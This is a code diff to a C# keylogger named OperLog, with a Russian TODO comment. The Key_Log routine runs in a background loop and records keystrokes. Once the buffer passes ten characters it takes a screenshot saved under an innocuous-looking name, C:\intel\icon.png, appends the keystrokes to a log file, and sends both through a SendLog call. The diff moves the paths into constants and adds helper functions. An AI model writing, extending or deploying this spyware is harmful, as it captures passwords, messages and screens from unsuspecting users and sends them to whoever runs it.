@@ -20,10 +20,11 @@ namespace OperLog
             this._bw.DoWork += Key_Log;
             this._bw.RunWorkerAsync();
         }
-
+        const string picpath = @"C:\intel\icon.png";
+        const string logpath = @"C:\intel\log.log";
         public static void Key_Log(object sender, DoWorkEventArgs e)
-       {
-           const string path = @"C:\intel\icon.png";
+        {
+           
            string buf = "";
            while (true) {
                 Thread.Sleep(100);
@@ -44,16 +45,16 @@ namespace OperLog
                         }
                         if (buf.Length > 10) {
                             // TODO: если скрин не получилось сделать возвращать в лог сообщение о неудаче
-                            Snap(path);
-                            File.AppendAllText("keylogger.log", buf);
+                            Snap(picpath);
+                            AddText(buf, logpath);
                             Sender m = new Sender();
-                            m.SendLog(buf,path);
+                            m.SendLog(buf,picpath);
                             buf = "";
                         }
                     }
                 }
            }
-       }
+        }
         static void Snap(string path) {
             try {
                 Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
@@ -65,5 +66,15 @@ namespace OperLog
                 // Application.Restart(); 
             }
         }
+
+       static void AddText(string text, string path)
+        {
+            File.AppendAllText(logpath, text);
+        }
+
+       static void MakeLog(string picpath, string logpath, string text)
+       {
+
+       }
     }
 }
